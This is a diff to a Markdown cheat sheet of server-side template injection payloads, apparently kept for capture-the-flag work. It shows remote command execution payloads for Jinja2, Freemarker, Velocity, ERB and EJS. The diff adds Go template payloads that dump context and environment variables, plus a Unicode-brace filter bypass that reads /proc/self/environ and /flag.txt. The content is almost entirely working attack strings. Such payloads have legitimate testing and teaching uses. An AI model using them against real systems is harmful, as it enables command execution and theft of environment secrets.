@@ -1,6 +1,6 @@
 # SSTI
 
-## Fast Tests
+## Try
 
 ```text
 {{7*7}}
@@ -10,7 +10,7 @@ ${7*7}
 *{7*7}
 ```
 
-## Payloads
+## RCE
 
 ```django
 {{lipsum.__globals__.os.popen('id').read()}} // Using Jinja 2
@@ -61,6 +61,24 @@ Freemarker: <#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("id")
 Velocity: #set($s='')#set($x=$s.class.forName('java.lang.Runtime').getRuntime().exec('id'))
 ERB: <%= `id` %>
 EJS: <%= global.process.mainModule.require('child_process').execSync('id') %>
+```
+
+## Go Template
+
+```gotemplate
+{{printf "%#v" .}}
+{{range $k,$v := .}}{{printf "%s=%v\n" $k $v}}{{end}}
+{{range $k,$v := .Data}}{{printf "%s=%v\n" $k $v}}{{end}}
+{{ getenv "FLAG" }}
+{{ env "FLAG" }}
+{{ index (env) "FLAG" }}
+```
+
+If braces are filtered before Unicode normalization:
+
+```text
+﹛﹛ .Ctx.Response.SendFile "/proc/self/environ" ﹜﹜
+﹛﹛ .Ctx.Response.SendFile "/flag.txt" ﹜﹜
 ```
 
 Read Code From Blackbox
